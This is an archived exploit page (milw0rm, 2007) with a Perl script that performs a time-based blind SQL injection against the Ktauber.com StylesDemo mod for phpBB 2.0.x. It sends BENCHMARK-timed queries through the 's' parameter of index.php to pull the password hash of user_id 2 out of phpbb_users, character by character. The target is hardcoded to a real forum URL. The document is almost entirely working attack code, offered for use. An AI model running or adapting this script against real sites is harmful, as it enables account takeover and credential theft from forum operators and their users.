<html><head><title>phpBB Mod Ktauber.com StylesDemo Blind SQL Injection Exploit</title></head><pre>#---------------------------------------------------------------
# ____            __________         __             ____  __   
#/_   | ____     |__\_____  \  _____/  |_          /_   |/  |_ 
# |   |/    \    |  | _(__  &lt;_/ ___\   __\  ______  |   \   __\
# |   |   |  \   |  |/       \  \___|  |   /_____/  |   ||  |  
# |___|___|  /\__|  /______  /\___  &gt;__|            |___||__|  
#          \/\______|      \/     \/                           
#---------------------------------------------------------------
#
#Http://www.inj3ct-it.org	    Staff[at]inj3ct-it[dot]org	
#
#--------------------------------------------------------------
#
#Ktauber.com StylesDemo Mod for phpbb 2.0.xx Multiple Vulnerabilites
#
#---------------------------------------------------------------
#
# Coded by nexen
#
# GreetZ: Rossi46go for code 
#
# Description:
#
#XSS and SQL Injection
#
#---------------------------------------------------------------
#
#
#
#
#---------------------------------------------------------------
#exploit.pl
#---------------------------------------------------------------
#
#
#
use LWP::UserAgent;
use HTTP::Request::Common;
use Time::HiRes;
######################################## CONFIGURAZIONE EXPLOIT ##########################################################################
$sito = &quot;http://www.forumup.com/stylesdemo/&quot;; # insert vulnerable site as http://[site]/[path]/
##########################################################################################################################################
$var = &quot;1&quot;;
my $hash;
@array = (48,49,50,51,52,53,54,55,56,57,97,98,99,100,101,102);

sub richiesta {
$var = $_[0];
$ua = LWP::UserAgent-&gt;new;
$inizio=Time::HiRes::time();
$response = $ua-&gt;request(GET $var,
s =&gt; $var);
$response-&gt;is_success() || print(&quot;$!\n&quot;);
$fine=Time::HiRes::time();
$tempo=$fine-$inizio;
return $tempo
}

sub aggiorna{
system(&quot;cls&quot;);
print &quot;Tempo sql : &quot; . $_[4] . &quot; secondi\n&quot;;
print &quot;Hash : &quot; . $_[3] . &quot;\n&quot;;
}

#print richiesta;

for ($i=1;$i&lt;33;$i++)
{
for ($j=0;$j&lt;16;$j++)
{

$var=$sito.&quot;index.php?s=(SELECT IF((ASCII(SUBSTRING(`user_password`,&quot;.$i.&quot;,1))=&quot;.$array[$j].&quot;),benchmark(200000000,CHAR(0)),0) FROM phpbb_users WHERE `user_id`=2)/*&quot;;
$tempo=richiesta($var);
aggiorna($host,$tempodefault,$j,$hash,$tempo,$i);
if($tempo&gt;9)
{
$tempo=richiesta($var);
aggiorna($host,$tempodefault,$j,$hash,$tempo,$i);
if($tempo&gt;9)
{
$hash .=chr($array[$j]);
aggiorna($host,$tempodefault,$j,$hash,$tempo,$i);
$j=200;
}
}

}
if($i==1)
{
if($hash eq &quot;&quot;)
{
$i=200;
print &quot;Attacco Fallito Sito Fixato\n&quot;;
}
}
}


print &quot;Attacco Terminato\n\n&quot;;

system(&quot;pause&quot;);

# milw0rm.com [2007-09-18]</pre></html>